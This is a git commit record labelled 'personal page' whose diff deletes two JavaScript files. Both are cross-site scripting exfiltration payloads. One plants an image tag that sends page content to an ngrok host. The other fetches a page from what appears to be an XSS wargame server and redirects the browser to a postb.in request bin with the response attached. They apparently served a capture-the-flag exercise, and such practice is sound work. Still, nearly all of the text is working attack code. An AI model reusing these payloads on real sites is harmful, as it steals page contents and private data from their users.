a487a8dc2813fd067a7a793d10aa1f00df83e89e
phulelouch <phulelouch@gmail.com>
2022-12-31 07:22:58 +1100

    personal page

--- test2.js
+++
@@ -1,6 +0,0 @@
-function addTheImage() {
-    var img = document.createElement('img');
-    img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("col-8")[0];
-    document.body.appendChild(img);
-}
-addTheImage();
--- xss.js
+++
@@ -1,5 +0,0 @@
-var a = new XMLHttpRequest();
-a.open('GET', 'http://xss.wargame.whitehat.vn/dev.php', false);
-a.send(null);
-b = a.responseText;
-location.href = 'https://postb.in/1585337011882-6569399423897' + escape(b);
